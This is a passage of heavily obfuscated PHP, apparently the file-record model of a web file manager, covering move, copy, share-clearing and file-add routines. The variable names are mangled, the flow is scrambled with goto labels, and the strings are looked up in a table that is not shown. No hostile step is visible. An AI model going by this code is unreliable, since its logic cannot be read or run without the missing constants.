$E«ºÛƒ­“Ä[87]) { $this->_childrenListAll($c¥é–³µİ±, $f³õ©À²Ñ); } } } private function sourceInfoCache($d—–§Ì¬¡™) { if (isset($this->_childrenItemCache[$d—–§Ì¬¡™])) { return $this->_childrenItemCache[$d—–§Ì¬¡™]; } return $this->sourceInfo($d—–§Ì¬¡™); } private function _childrenList($B¸²§’ ‡É) { if (isset($this->_childrenListCache[$B¸²§’ ‡É])) { return $this->_childrenListCache[$B¸²§’ ‡É]; } return $this->_childrenListSelect($B¸²§’ ‡É); } private function _childrenListSelect($f’ÒÊØô¥Ò) { goto B˜‡Áµ¤äæ; A²‘ÂÈØÔ˜: foreach ($Fš»ò‰öÛİ as $f’ÒÊØô¥Ò => $f†‡Û­šëä) { $this->_childrenItemCache[$f’ÒÊØô¥Ò] = $f†‡Û­šëä; } return $Fš»ò‰öÛİ; goto C¾Îâ”¾‘; Dø§‰ìŠóÊ: $câ®µØ¨î„ = $câ®µØ¨î„ ? $câ®µØ¨î„ : array(); $Fš»ò‰öÛİ = array_to_keyvalue($câ®µØ¨î„, $C‘‰à½Ğ¡â[394]); $this->_childrenListCache[$f’ÒÊØô¥Ò] = $Fš»ò‰öÛİ; goto A²‘ÂÈØÔ˜; B˜‡Áµ¤äæ: $C‘‰à½Ğ¡â =& $_SERVER[´¬]; $Aãà–±õ¬ˆ = array($C‘‰à½Ğ¡â[476] => $f’ÒÊØô¥Ò, $C‘‰à½Ğ¡â[421] => $this->targetIsDelete); $câ®µØ¨î„ = $this->where($Aãà–±õ¬ˆ)->select(); goto Dø§‰ìŠóÊ; C¾Îâ”¾‘: } private function fileNameExistCache($fì¸ĞÔÄù›, $cÂ™õ•°æ) { $F¡öâ±…Õß =& $_SERVER[´¬]; $cÂ™õ•°æ = strtolower($cÂ™õ•°æ); $d •­î»ğ³ = $this->_childrenList($fì¸ĞÔÄù›); foreach ($d •­î»ğ³ as $a‰åªÚ„äÙ) { if ($cÂ™õ•°æ == strtolower($a‰åªÚ„äÙ[$F¡öâ±…Õß[28]])) { return $a‰åªÚ„äÙ[$F¡öâ±…Õß[394]]; } } return !1; } private function fileNameAutoCache($EŞÉ±ÈÈÓí, $BÌ‘•Û•—…, $a’âÑ‰ÓÃŞ, $BÉøËêèñ) { $e§†éŞ» =& $_SERVER[´¬]; $b´ßù‰Ê×Ø = $this->_childrenList($EŞÉ±ÈÈÓí); $f§ Â¤ö‡ = array_to_keyvalue($b´ßù‰Ê×Ø, $e§†éŞ»[33], $e§†éŞ»[28]); return $this->fileNameAutoGet($f§ Â¤ö‡, $BÌ‘•Û•—…, $a’âÑ‰ÓÃŞ, $BÉøËêèñ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e†êÊè¯µ¥, $Cœ¶ÃŸß‹, $e§Õ…“ÎÍˆ = REPEAT_REPLACE, $Cñì¢ÅÉë» = '') { goto A…–Üğ¸; câã°©±¢: if (!$f¨ÕÚòˆ¾ || !$B…¥‡£‰Ñ || $B…¥‡£‰Ñ[$CÑõòÚŞ ƒ[401]] != $CÑõòÚŞ ƒ[87]) { return !1; } Hook::trigger($CÑõòÚŞ ƒ[557], $e‡ëÌ‹ Œ¹); $this->targetIsDelete = intval($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[421]]); goto c£‰­‚»Äô; FÏİ°¡§ë˜: $this->lockWriteStart($Cœ¶ÃŸß‹, $f¡ÇŞóŞå); $C¤Æé¹Û‡ğ = array($CÑõòÚŞ ƒ[528] => array(), $CÑõòÚŞ ƒ[559] => !1); $this->clearShare($e†êÊè¯µ¥, $Cœ¶ÃŸß‹); goto c¶êò¹¬÷³; a‚ã‚ãŞõ”: if ($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[401]] == $CÑõòÚŞ ƒ[87] && $EØäèäÏ²) { $this->folderSizeResetChildren($EÈ¶Ë”ùç§); } Model($CÑõòÚŞ ƒ[192])->linkAdd($C¤Æé¹Û‡ğ[$CÑõòÚŞ ƒ[528]]); if ($EØäèäÏ² && $C¤Æé¹Û‡ğ[$CÑõòÚŞ ƒ[559]]) { $this->removeNow($e†êÊè¯µ¥, !1); } goto c³ó‰Î÷; c£‰­‚»Äô: if ($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[476]] == $Cœ¶ÃŸß‹ && $Cñì¢ÅÉë» != $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[28]]) { $cø¥Îç’‘ = $this->fileNameExist($Cœ¶ÃŸß‹, $Cñì¢ÅÉë»); if ($cø¥Îç’‘ && $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[401]] == $CÑõòÚŞ ƒ[495]) { goto f»‘ä§ö³È; F¯„ô‡Å§: $this->removeNow($e†êÊè¯µ¥, !1); $this->folderSizeReset($Cœ¶ÃŸß‹); Hook::trigger($CÑõòÚŞ ƒ[558], $e‡ëÌ‹ Œ¹); goto c•…Ÿ¼†Ñ˜; f»‘ä§ö³È: $Ağ¶ŒÌÉ˜Ñ = $this->sourceInfo($cø¥Îç’‘); $DÊœéï¼²° = $this->fileHistory($Ağ¶ŒÌÉ˜Ñ, $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[445]], $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[78]]); if (!$DÊœéï¼²°) { Model($CÑõòÚŞ ƒ[448])->remove($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[445]]); } goto F¯„ô‡Å§; c•…Ÿ¼†Ñ˜: return $cø¥Îç’‘; goto C£ÀŸ’¢; C£ÀŸ’¢: } } $f¡ÇŞóŞå = $Cñì¢ÅÉë» ? $Cñì¢ÅÉë» : $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[28]]; $this->lockMoveStart($e†êÊè¯µ¥); goto FÏİ°¡§ë˜; A…–Üğ¸: $CÑõòÚŞ ƒ =& $_SERVER[´¬]; $f¨ÕÚòˆ¾ = $this->sourceInfo($e†êÊè¯µ¥); $B…¥‡£‰Ñ = $this->sourceInfo($Cœ¶ÃŸß‹); goto Fº¾¿é›Ôˆ; Fº¾¿é›Ôˆ: if ($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[476]] == $B…¥‡£‰Ñ[$CÑõòÚŞ ƒ[394]]) { if ($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[421]] == $CÑõòÚŞ ƒ[87]) { Model($CÑõòÚŞ ƒ[419])->restore(array($e†êÊè¯µ¥)); } if (!$Cñì¢ÅÉë» || $Cñì¢ÅÉë» == $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[28]]) { return $e†êÊè¯µ¥; } } $e‡ëÌ‹ Œ¹ = $this->pathInfoMore($e†êÊè¯µ¥); if ($this->isParentOf($e†êÊè¯µ¥, $Cœ¶ÃŸß‹)) { return !1; } goto câã°©±¢; c¶êò¹¬÷³: $EØäèäÏ² = $this->fileNameExistCache($Cœ¶ÃŸß‹, $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[28]]); $EÈ¶Ë”ùç§ = $this->_move($e†êÊè¯µ¥, $Cœ¶ÃŸß‹, $e§Õ…“ÎÍˆ, $C¤Æé¹Û‡ğ, $Cñì¢ÅÉë»); $this->sourceCacheClear(); goto a‚ã‚ãŞõ”; d¢¢èØÙé: return $EÈ¶Ë”ùç§; goto F ³éš‡ò; c³ó‰Î÷: $this->lockMoveEnd($e†êÊè¯µ¥); $this->lockWriteEnd($Cœ¶ÃŸß‹, $f¡ÇŞóŞå); $this->folderSizeReset($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[476]]); goto BÊ¯‹ˆ†; E çµ‘…˜ã: $this->updateModifyTime($bË¿ã•¡­); Model($CÑõòÚŞ ƒ[532])->eventMove($e†êÊè¯µ¥, $f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[476]], $Cœ¶ÃŸß‹); Hook::trigger($CÑõòÚŞ ƒ[558], $e‡ëÌ‹ Œ¹); goto d¢¢èØÙé; BÊ¯‹ˆ†: $this->folderSizeReset($Cœ¶ÃŸß‹); $bË¿ã•¡­ = array($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[476]], $Cœ¶ÃŸß‹); if ($f¨ÕÚòˆ¾[$CÑõòÚŞ ƒ[401]] == $CÑõòÚŞ ƒ[87]) { $bË¿ã•¡­[] = $e†êÊè¯µ¥; } goto E çµ‘…˜ã; F ³éš‡ò: } private function _move($c¯ƒ¸ªºÆ, $E˜…ñ‹š‘, $bç½¦ù½¢£, &$dÆµ¸¢„Ù, $d¦º–‹Ú = '') { goto DŠõÖèçØ; dÆéÙØà¨‚: return $F‘È®áö·; goto cœÙğ¯´³†; cÌÙ¹æÚ×ì: $b¸Æ¿Ö‘³¨ = !1; if ($D®™¹¯ìÌÏ) { if ($bç½¦ù½¢£ == REPEAT_RENAME_FOLDER) { $EËøİó³ì¿ = $this->fileNameAuto($E˜…ñ‹š‘, $EËøİó³ì¿, $bç½¦ù½¢£, $D®™¹¯ìÌÏ); $F‘È®áö· = $this->_moveForce($c¯ƒ¸ªºÆ, $E˜…ñ‹š‘, $EËøİó³ì¿); } else { if ($bç½¦ù½¢£ == REPEAT_RENAME_FOLDER) { $bç½¦ù½¢£ = REPEAT_RENAME; } $AÜ”ÛÍ³ï– = $this->_childrenListSelect($c¯ƒ¸ªºÆ); foreach ($AÜ”ÛÍ³ï– as $dßÕŠ§î­è) { $this->_move($dßÕŠ§î­è[$BÂÖƒß©ÉÙ[394]], $B„ôÓÉöç, $bç½¦ù½¢£, $dÆµ¸¢„Ù); } $b¸Æ¿Ö‘³¨ = !0; } } else { if ($bç½¦ù½¢£ == REPEAT_SKIP) { $b¸Æ¿Ö‘³¨ = !0; } else { if ($bç½¦ù½¢£ == REPEAT_RENAME || $bç½¦ù½¢£ == REPEAT_RENAME_FOLDER) { $EËøİó³ì¿ = $this->fileNameAuto($E˜…ñ‹š‘, $EËøİó³ì¿, $bç½¦ù½¢£, $D®™¹¯ìÌÏ); $F‘È®áö· = $this->_moveForce($c¯ƒ¸ªºÆ, $E˜…ñ‹š‘, $EËøİó³ì¿); } else { if ($bç½¦ù½¢£ == REPEAT_REPLACE) { $BóÚ•¥Ô¸ˆ = $this->sourceInfoCache($B„ôÓÉöç); $b«ŞÏ‰¬Š¬ = $this->fileHistory($BóÚ•¥Ô¸ˆ, $dŞ«³½¹¯é[$BÂÖƒß©ÉÙ[445]], $dŞ«³½¹¯é[$BÂÖƒß©ÉÙ[78]]); if ($b«ŞÏ‰¬Š¬) { $dÆµ¸¢„Ù[$BÂÖƒß©ÉÙ[528]][] = $dŞ«³½¹¯é[$BÂÖƒß©ÉÙ[445]]; } else { $b¸Æ¿Ö‘³¨ = !0; } } } } } if ($b¸Æ¿Ö‘³¨ && !$dÆµ¸¢„Ù[$BÂÖƒß©ÉÙ[559]]) { $dÆµ¸¢„Ù[$BÂÖƒß©ÉÙ[559]] = !0; } goto dÆéÙØà¨‚; eêº„ˆ¸©Ø: $this->lockWriteStart($E˜…ñ‹š‘, $EËøİó³ì¿); if (!$B„ôÓÉöç) { return $this->_moveForce($c¯ƒ¸ªºÆ, $E˜…ñ‹š‘, $EËøİó³ì¿); } $F‘È®áö· = $B„ôÓÉöç; goto cÌÙ¹æÚ×ì; DŠõÖèçØ: $BÂÖƒß©ÉÙ =& $_SERVER[´¬]; $dŞ«³½¹¯é = $this->sourceInfo($c¯ƒ¸ªºÆ); $D®™¹¯ìÌÏ = $dŞ«³½¹¯é[$BÂÖƒß©ÉÙ[401]] == $BÂÖƒß©ÉÙ[87]; goto BÇğ½¬ğ±ƒ; BÇğ½¬ğ±ƒ: $EËøİó³ì¿ = $d¦º–‹Ú ? $d¦º–‹Ú : $dŞ«³½¹¯é[$BÂÖƒß©ÉÙ[28]]; $B„ôÓÉöç = $this->fileNameExistCache($E˜…ñ‹š‘, $EËøİó³ì¿); $this->lockMoveStart($c¯ƒ¸ªºÆ); goto eêº„ˆ¸©Ø; cœÙğ¯´³†: } private function _moveForce($FÁ‚¸¿‘Ó‰, $C£ÄƒˆÔÁ, $e…ßŠ¶åÈ) { goto AÈŠ˜…Š»Ö; AÈŠ˜…Š»Ö: $eøŠÄËõÏ‚ =& $_SERVER[´¬]; $a©„ò­¬‘¶ = $this->sourceInfo($FÁ‚¸¿‘Ó‰); $DÇŞ§äø¶‘ = $this->sourceInfo($C£ÄƒˆÔÁ); goto A“ù™æ©Öè; Aœ —ÊĞ›­: if ($DŒ—Í•ğ¬) { $C‡¥Ş‹‚Ğ‘ = array($eøŠÄËõÏ‚[552] => array($eøŠÄËõÏ‚[511], $a©„ò­¬‘¶[$eøŠÄËõÏ‚[485]] . $a©„ò­¬‘¶[$eøŠÄËõÏ‚[394]] . $eøŠÄËõÏ‚[512])); $dâ¼‹Èğ¡ = $a©„ò­¬‘¶[$eøŠÄËõÏ‚[485]] . $a©„ò­¬‘¶[$eøŠÄËõÏ‚[394]] . $eøŠÄËõÏ‚[47]; $F°æ¯ÇëÆ = $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[485]] . $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[394]] . $eøŠÄËõÏ‚[47] . $a©„ò­¬‘¶[$eøŠÄËõÏ‚[394]] . $eøŠÄËõÏ‚[47]; $EôÍÊ¶ö• = array($eøŠÄËõÏ‚[552] => array($eøŠÄËõÏ‚[560], "\162\145\x70\154\141\x63\145\50\160\x61\x72\145\x6e\x74\x4c\145\x76\x65\154\x2c\47{$dâ¼‹Èğ¡}\47\x2c\47{$F°æ¯ÇëÆ}\47\51"), $eøŠÄËõÏ‚[548] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[402]], $eøŠÄËõÏ‚[549] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[482]]); if ($f©’‚°›¶ƒ) { $EôÍÊ¶ö•[$eøŠÄËõÏ‚[420]] = 0; } $this->where($C‡¥Ş‹‚Ğ‘)->data($EôÍÊ¶ö•)->save(); } $this->where(array($eøŠÄËõÏ‚[408] => $FÁ‚¸¿‘Ó‰))->data($D¡›ÃÊÑÂé)->save(); return $FÁ‚¸¿‘Ó‰; goto dä²…Ø„œÊ; A“ù™æ©Öè: $DŒ—Í•ğ¬ = $a©„ò­¬‘¶[$eøŠÄËõÏ‚[401]] == $eøŠÄËõÏ‚[87]; $D¡›ÃÊÑÂé = array($eøŠÄËõÏ‚[393] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[394]], $eøŠÄËõÏ‚[552] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[485]] . $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[394]] . $eøŠÄËõÏ‚[47], $eøŠÄËõÏ‚[548] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[402]], $eøŠÄËõÏ‚[549] => $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[482]], $eøŠÄËõÏ‚[551] => USER_ID, $eøŠÄËõÏ‚[411] => $e…ßŠ¶åÈ); $fø•§§…Ñ = $a©„ò­¬‘¶[$eøŠÄËõÏ‚[402]] == SourceModel::TYPE_GROUP && $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[402]] == SourceModel::TYPE_GROUP && $a©„ò­¬‘¶[$eøŠÄËõÏ‚[482]] == $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[482]]; goto eí•ï‚Æõ; eí•ï‚Æõ: if (!$fø•§§…Ñ && $this->moveClearAuth) { Model($eøŠÄËõÏ‚[480])->authClear($FÁ‚¸¿‘Ó‰); } $f©’‚°›¶ƒ = $a©„ò­¬‘¶[$eøŠÄËõÏ‚[421]] == $eøŠÄËõÏ‚[87] && $DÇŞ§äø¶‘[$eøŠÄËõÏ‚[421]] != $eøŠÄËõÏ‚[87]; if ($f©’‚°›¶ƒ) { $D¡›ÃÊÑÂé[$eøŠÄËõÏ‚[420]] = 0; } goto Aœ —ÊĞ›­; dä²…Ø„œÊ: } private function clearShare($aªŒ•Á®’İ, $B‹ƒŒÄªö©) { goto Eš±±¤š‹÷; fğŠ·è¨ÆÛ: if (!$EÔÇç«ƒœ) { return; } $EÔÇç«ƒœ = array_to_keyvalue($EÔÇç«ƒœ, $Aå¢ÈåÑ¹Ò[33], $Aå¢ÈåÑ¹Ò[466]); $b—İå¿ª› = array($Aå¢ÈåÑ¹Ò[466] => array($Aå¢ÈåÑ¹Ò[7], $EÔÇç«ƒœ)); goto BÎŒ¼ãÃ ; F†•›¡ÏÑ: if ($aùï¶ë°‰¡[$Aå¢ÈåÑ¹Ò[482]] == $EßÁ“ÓÖŞÜ[$Aå¢ÈåÑ¹Ò[482]] && $aùï¶ë°‰¡[$Aå¢ÈåÑ¹Ò[402]] == $Aå¢ÈåÑ¹Ò[561]) { return; } $b—İå¿ª› = array($Aå¢ÈåÑ¹Ò[485] => array($Aå¢ÈåÑ¹Ò[511], $aùï¶ë°‰¡[$Aå¢ÈåÑ¹Ò[485]] . $aªŒ•Á®’İ . $Aå¢ÈåÑ¹Ò[512])); $B›ô›«••Ÿ = $this->field($Aå¢ÈåÑ¹Ò[408])->where($b—İå¿ª›)->getField($Aå¢ÈåÑ¹Ò[394], !0); goto C Õ¶”Ë®; C Õ¶”Ë®: if (!$B›ô›«••Ÿ) { return; } $b—İå¿ª› = array($Aå¢ÈåÑ¹Ò[394] => array($Aå¢ÈåÑ¹Ò[7], $B›ô›«••Ÿ), $Aå¢ÈåÑ¹Ò[473] => 1); $EÔÇç«ƒœ = Model($Aå¢ÈåÑ¹Ò[562])->field($Aå¢ÈåÑ¹Ò[466])->where($b—İå¿ª›)->select(); goto fğŠ·è¨ÆÛ; Eš±±¤š‹÷: $Aå¢ÈåÑ¹Ò =& $_SERVER[´¬]; $aùï¶ë°‰¡ = $this->sourceInfo($aªŒ•Á®’İ); $EßÁ“ÓÖŞÜ = $this->sourceInfo($B‹ƒŒÄªö©); goto F†•›¡ÏÑ; BÎŒ¼ãÃ : Model($Aå¢ÈåÑ¹Ò[562])->where($b—İå¿ª›)->save(array($Aå¢ÈåÑ¹Ò[473] => 0)); Model($Aå¢ÈåÑ¹Ò[563])->where($b—İå¿ª›)->delete(); goto Aº’”Í·—Ô; Aº’”Í·—Ô: } public function copyFolderFromIO($E³É“¬õ‹Ã, $C•¾‹¢», $DªÁñò‡Õ, $d³ÅÃ¤ÇÆÌ, $dËÔ™²öÏ, $cğ…ßèÓêÚ = false) { goto e¶Ù³ÎšÃ; F…â¤áÙáë: Hook::trigger($còî“ßĞ‚‘[566]); if ($C´‰ĞßæÁ•) { $this->folderSizeResetChildren($C´‰ĞßæÁ•); } $this->_childrenListClear(); goto EÔ‰Ÿ—‘„; EÔ‰Ÿ—‘„: Model($còî“ßĞ‚‘[531])->addAll($Aà…ŸÑïÙ•[$còî“ßĞ‚‘[529]], array(), !0); Model($còî“ßĞ‚‘[532])->eventCopy($C´‰ĞßæÁ•); $this->saveAll($Aà…ŸÑïÙ•[$còî“ßĞ‚‘[530]]); goto D²¾öŒĞÉÁ; C¥Ğ±…ø: if ($F„ªî¡ùÚ) { $this->_childrenAllMake($F„ªî¡ùÚ); } Hook::trigger($còî“ßĞ‚‘[565]); $this->_copyChildTo($E³É“¬õ‹Ã, $C•¾‹¢», $C´‰ĞßæÁ•, $d³ÅÃ¤ÇÆÌ, $Aà…ŸÑïÙ•, $dËÔ™²öÏ); goto F…â¤áÙáë; e¶Ù³ÎšÃ: $còî“ßĞ‚‘ =& $_SERVER[´¬]; $Aà…ŸÑïÙ• = array($còî“ßĞ‚‘[529] => array(), $còî“ßĞ‚‘[530] => array(), $còî“ßĞ‚‘[528] => array(), $còî“ßĞ‚‘[564] => array()); $fĞË¦ÔêƒÌ = $cğ…ßèÓêÚ ? $cğ…ßèÓêÚ : $E³É“¬õ‹Ã->pathThis($C•¾‹¢»); goto FÍ¢×îæ±Ğ; D²¾öŒĞÉÁ: Model($còî“ßĞ‚‘[448])->linkAdd($Aà…ŸÑïÙ•[$còî“ßĞ‚‘[528]]); Model($còî“ßĞ‚‘[448])->remove($Aà…ŸÑïÙ•[$còî“ßĞ‚‘[564]]); $this->folderSizeReset($DªÁñò‡Õ); goto a³ˆ¾È¢¢î; a³ˆ¾È¢¢î: $this->updateModifyTime($DªÁñò‡Õ); return $C´‰ĞßæÁ•; goto fÛ—îõ; FÍ¢×îæ±Ğ: $F„ªî¡ùÚ = $this->fileNameExist($DªÁñò‡Õ, $fĞË¦ÔêƒÌ); $C´‰ĞßæÁ• = $this->mkdir($DªÁñò‡Õ, $fĞË¦ÔêƒÌ, $d³ÅÃ¤ÇÆÌ); if (!$F„ªî¡ùÚ || $d³ÅÃ¤ÇÆÌ == REPEAT_RENAME_FOLDER) { $d³ÅÃ¤ÇÆÌ = !1; } goto C¥Ğ±…ø; fÛ—îõ: } private function _copyChildTo($D©¢»â˜½Í, $A©Ó“•Ä—, $a‹š¾ää’Å, $AÜÀ‡Ë¸Ş†, &$fÀÃ’çá˜†, $fÖŒ›×â’) { goto d¨Œñ“¨Àµ; d¨Œñ“¨Àµ: $D”ƒ§µš¤ =& $_SERVER[´¬]; $FÌÒ«ª¥â = $this->sourceInfoCache($a‹š¾ää’Å); $D¸î¢Ó¼óˆ = $D©¢»â˜½Í->listPath($A©Ó“•Ä—); goto d’é·õËÃ§; F¤ã²Œµ: foreach ($Aº¥³‘¸¿î as $cÄĞ“‘¸¯) { $B«”Á·Óó¹ = $dùàŞŠ³Ÿ‘[$cÄĞ“‘¸¯[$D”ƒ§µš¤[28]]]; $C‚†Û”’Óğ = $B«”Á·Óó¹[$D”ƒ§µš¤[394]]; $this->_copyApplyMeta($B«”Á·Óó¹, $fÀÃ’çá˜†); if ($cÄĞ“‘¸¯[$D”ƒ§µš¤[29]] == $D”ƒ§µš¤[77]) { $cÄĞ“‘¸¯[$D”ƒ§µš¤[76]] = $D©¢»â˜½Í->getPathInner($cÄĞ“‘¸¯[$D”ƒ§µš¤[76]]); $this->_copyChildTo($D©¢»â˜½Í, $cÄĞ“‘¸¯[$D”ƒ§µš¤[76]], $C‚†Û”’Óğ, $AÜÀ‡Ë¸Ş†, $fÀÃ’çá˜†, $fÖŒ›×â’); } } goto dêùãëöŸ…; d’é·õËÃ§: $D¸î¢Ó¼óˆ = $D¸î¢Ó¼óˆ ? $D¸î¢Ó¼óˆ : array($D”ƒ§µš¤[74] => array(), $D”ƒ§µš¤[75] => array()); $Aº¥³‘¸¿î = array_merge($D¸î¢Ó¼óˆ[$D”ƒ§µš¤[74]], $D¸î¢Ó¼óˆ[$D”ƒ§µš¤[75]]); $C¡ˆŸÎ­æ° = $this->_addFiles($D©¢»â˜½Í, $D¸î¢Ó¼óˆ[$D”ƒ§µš¤[74]], $fÖŒ›×â’); goto bê×ëéİ¸²; bÔòï‰ê•ß: if (!empty($F¬½õâ§öÜ)) { $this->addAll($F¬½õâ§öÜ); $this->_childrenListSelect($a‹š¾ää’Å); } $dùàŞŠ³Ÿ‘ = $this->_childrenList($a‹š¾ää’Å); $dùàŞŠ³Ÿ‘ = array_to_keyvalue($dùàŞŠ³Ÿ‘, $D”ƒ§µš¤[28]); goto F¤ã²Œµ; bê×ëéİ¸²: $F¬½õâ§öÜ = array(); foreach ($Aº¥³‘¸¿î as &$cÄĞ“‘¸¯) { goto E–ó½éÙ¹İ; AàÎÖ—ï³Ö: $cÄĞ“‘¸¯[$D”ƒ§µš¤[78]] = _get($cÄĞ“‘¸¯, $D”ƒ§µš¤[78], 0); $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]] = _get($cÄĞ“‘¸¯, $D”ƒ§µš¤[445], 0); if (!isset($cÄĞ“‘¸¯[$D”ƒ§µš¤[567]]) && $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]]) { $fÀÃ’çá˜†[$D”ƒ§µš¤[564]][] = $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]]; } goto c÷¬ÜÛÆˆŠ; c÷¬ÜÛÆˆŠ: if ($AÜÀ‡Ë¸Ş†) { $bÅ•¶ÔõŞ¹ = $this->fileNameExistCache($a‹š¾ää’Å, $cÄĞ“‘¸¯[$D”ƒ§µš¤[28]]); if ($bÅ•¶ÔõŞ¹) { if ($cÄĞ“‘¸¯[$D”ƒ§µš¤[401]] || $AÜÀ‡Ë¸Ş† == REPEAT_SKIP) { continue; } if ($AÜÀ‡Ë¸Ş† == REPEAT_REPLACE) { $B«”Á·Óó¹ = $this->sourceInfoCache($bÅ•¶ÔõŞ¹); $B¡šæÖÅ¾ = $this->fileHistory($B«”Á·Óó¹, $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]], $cÄĞ“‘¸¯[$D”ƒ§µš¤[78]]); if ($B¡šæÖÅ¾) { $fÀÃ’çá˜†[$D”ƒ§µš¤[528]][] = $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]]; } continue; } else { if ($AÜÀ‡Ë¸Ş† == REPEAT_RENAME) { $cÄĞ“‘¸¯[$D”ƒ§µš¤[28]] = $this->fileNameAutoCache($a‹š¾ää’Å, $cÄĞ“‘¸¯[$D”ƒ§µš¤[28]], $AÜÀ‡Ë¸Ş†, !1); } } } } if (!$cÄĞ“‘¸¯[$D”ƒ§µš¤[401]] && $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]]) { $fÀÃ’çá˜†[$D”ƒ§µš¤[528]][] = $cÄĞ“‘¸¯[$D”ƒ§µš¤[445]]; } $F¬½õâ§öÜ[] = $this->_makeItemData($cÄĞ“‘¸¯, $FÌÒ«ª¥â, $cÄĞ“‘¸¯[$D”ƒ§µš¤[28]]); goto eôŠ÷çºš„; E–ó½éÙ¹İ: if (isset($C¡ˆŸÎ­æ°[$cÄĞ“‘¸¯[$D”ƒ§µš¤[28]]])) { $cÄĞ“‘¸¯ = $C¡ˆŸÎ­æ°[$cÄĞ“‘¸¯[$D”ƒ§µš¤[28]]]; } $cÄĞ“‘¸¯[$D”ƒ§µš¤[401]] = $cÄĞ“‘¸¯[$D”ƒ§µš¤[29]] == $D”ƒ§µš¤[77]; $cÄĞ“‘¸¯[$D”ƒ§µš¤[403]] = _get($cÄĞ“‘¸¯, $D”ƒ§µš¤[168], $D”ƒ§µš¤[33]); goto AàÎÖ—ï³Ö; eôŠ÷çºš„: } unset($cÄĞ“‘¸¯); goto bÔòï‰ê•ß; dêùãëöŸ…: } private function _addFiles($e½³ÃÌÅ¯, $F¶Î–¡ƒ„í, $DÏÀÎ¶ÛÃ) { goto b¸Œˆù¬È; eÏÑõï§‘: foreach ($F¶Î–¡ƒ„í as &$e¾¥–ù÷Äğ) { goto d§ï‚ã¢«£; Cî† ‚õˆ: $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[170]] = $E¼Ôæ–ÑÂÎ; Hook::trigger($D£ä…’¹ÚÂ[569], $e¾¥–ù÷Äğ); $CìÍŒáÊò„[$E¼Ôæ–ÑÂÎ][] =& $e¾¥–ù÷Äğ; goto e­„ßé˜èİ; d§ï‚ã¢«£: Hook::trigger($D£ä…’¹ÚÂ[568], $e¾¥–ù÷Äğ); $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[76]] = $e½³ÃÌÅ¯->getPathInner($e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[76]]); $Aøà…ãĞ = $e½³ÃÌÅ¯->hashSimple($e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[76]]); goto a¢É‹Ã¾‡¹; a¢É‹Ã¾‡¹: $E¼Ôæ–ÑÂÎ = $e½³ÃÌÅ¯->hashMd5($e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[76]]); if (strlen($E¼Ôæ–ÑÂÎ) > 10 && !isset($CìÍŒáÊò„[$E¼Ôæ–ÑÂÎ])) { $CìÍŒáÊò„[$E¼Ôæ–ÑÂÎ] = array(); } $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[171]] = $Aøà…ãĞ; goto Cî† ‚õˆ; e­„ßé˜èİ: if (count($CìÍŒáÊò„[$E¼Ôæ–ÑÂÎ]) > 1) { $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[567]] = !0; } goto Báàš‰Ç…; Báàš‰Ç…: } unset($e¾¥–ù÷Äğ); $a×áºÀ¯éµ = array($D£ä…’¹ÚÂ[170] => array($D£ä…’¹ÚÂ[7], array_keys($CìÍŒáÊò„))); goto bµ›ƒÕ±¨§; eÙßµæÆ‹: foreach ($F¶Î–¡ƒ„í as $AëˆòÍ‚é±) { $b½è½±¾Ü[$AëˆòÍ‚é±[$D£ä…’¹ÚÂ[28]]] = $AëˆòÍ‚é±; } return $b½è½±¾Ü; goto E¸Ü¦—‘ìå; bµ›ƒÕ±¨§: $E²ÅÓŒ¸¯è = Model($D£ä…’¹ÚÂ[570]); $Dí¨±’ó–„ = $E²ÅÓŒ¸¯è->where($a×áºÀ¯éµ)->select(); $Dí¨±’ó–„ = $Dí¨±’ó–„ ? $Dí¨±’ó–„ : array(); goto d˜”†Îì‰÷; b¸Œˆù¬È: $D£ä…’¹ÚÂ =& $_SERVER[´¬]; if (!$F¶Î–¡ƒ„í || count($F¶Î–¡ƒ„í) == 0) { return array(); } $CìÍŒáÊò„ = array(); goto eÏÑõï§‘; d˜”†Îì‰÷: foreach ($Dí¨±’ó–„ as $eİ Çó¡„¬) { if (!isset($CìÍŒáÊò„[$eİ Çó¡„¬[$D£ä…’¹ÚÂ[170]]])) { continue; } $a™÷’¸öäí = $CìÍŒáÊò„[$eİ Çó¡„¬[$D£ä…’¹ÚÂ[170]]]; foreach ($a™÷’¸öäí as &$e¾¥–ù÷Äğ) { $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[445]] = $eİ 